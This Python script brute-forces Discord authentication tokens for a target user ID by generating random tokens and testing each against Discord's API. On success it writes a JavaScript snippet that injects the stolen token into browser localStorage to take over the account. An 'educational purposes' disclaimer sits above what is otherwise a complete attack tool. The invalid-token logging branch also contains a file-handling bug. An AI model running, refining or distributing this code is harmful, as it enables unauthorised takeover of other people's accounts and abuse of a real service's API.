# This is a simple python code that generates and bruteforces discord tokens given a UserID
# Keep in mind that this code is only for educational purposes!
# Do not try to bruteforce any account you don´t have permission to.
# Also, keep in mind it is almost impossible to find the valid token 
# There are about 431359146674410236714672241392314090778194310760649159697714564223040 token possibilities for each UserID
# Your chance of finding a valid token is:
# 0.000000000000000000000000000000000000000000000000000000000000000000000000002318

import os
from random import choice
import requests
from base64 import standard_b64encode
from string import ascii_letters, digits

userID="000000000000000000" # change this to the userID of the account you want to bruteforce. You can find this in discord app(18 characters long)
apiURL = "https://discord.com/api/v10/users/@me" # Discord API for the request

checkedList = [] # List used to check if the code was already generated
tokenInvalid = [] # Stores the invalid token
isTokenValid=False # Boolean for the while loop in request function
writeInvalidToken=True # Change this to True if you want to write all the invalid tokens you generated 

def generateToken(encodedUserID):
    """Generates Token based on encoded user ID, and returns token in discord format"""
    token = encodedUserID + '.' + choice(ascii_letters).upper() + ''.join(choice(ascii_letters + digits) \
            for _ in range(6)) + "." + ''.join(choice(ascii_letters + digits + '-_') for _ in range(38))

    return token

def encodeUserID(userID):
    """Encodes the UserID"""
    encodedUserID = standard_b64encode(userID.encode("ascii")).decode("utf-8")

    return encodedUserID

def headerToken(token):
    """Creates the header for the api request"""
    header={"Authorization": f"Bearer {token}"}

    return header

def request(encodedUserID):
    """Attempts to use generated tokens until a valid one is found"""
    global isTokenValid, writeInvalidToken

    while not isTokenValid:
        token = generateToken(encodedUserID)
        if token in checkedList:
            continue  # Skip already checked tokens

        header = headerToken(token)
        response = requests.get(apiURL, headers=header)

        print(f"\n\nTrying token: {token}\n")
        checkedList.append(token)

        if response.status_code == 200: # Token is valid
            print(f"\n\n\nValid Token Found: {token}")
            # Writes the javascript function to enter account using token
            f=open(".\\tokenFiles\\token.txt", "w", encoding="utf-8")
            f.write(f"Valid Token: {token}\n\nJavascript Function to login using found token:\n\n")
            f.write("function login(token) {\n")
            f.write("setInterval(() => {\n")
            f.write("document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `""${token}""`\n")
            f.write("}, 50);\n")
            f.write("setTimeout(() => {\n")
            f.write("location.reload();\n")
            f.write("}, 2500);\n")
            f.write("}\n")
            f.write(f"login ('{token}')")
            isTokenValid = True
        elif response.status_code == 401: # Token is invalid
            print(f"Token: {token} Invalid !")
            tokenInvalid.append(token) # If you don´t want to store invalid tokens in a list just comment this line
            if writeInvalidToken==True:
                f=open(".\\tokenFiles\\invalidTokens.txt", "a", encoding="utf-8")
            f.write(token+"\n")
            f.close()
        else:
            print(f"Unexpected Error: {response.status_code} - {response.text}")


def main(): #Main Function
    """Main function that calls other functions"""
    if not os.path.exists(".\\tokenFiles\\"):
        os.mkdir(".\\tokenFiles\\")
    f=open(".\\tokenFiles\\invalidTokens.txt", "w", encoding="utf-8") # If you want the program to save previous tokens, comment this and the next line
    f.close()
    encodedUserID = encodeUserID(userID)
    request(encodedUserID)


if __name__ == "__main__":
    main() #invokes main function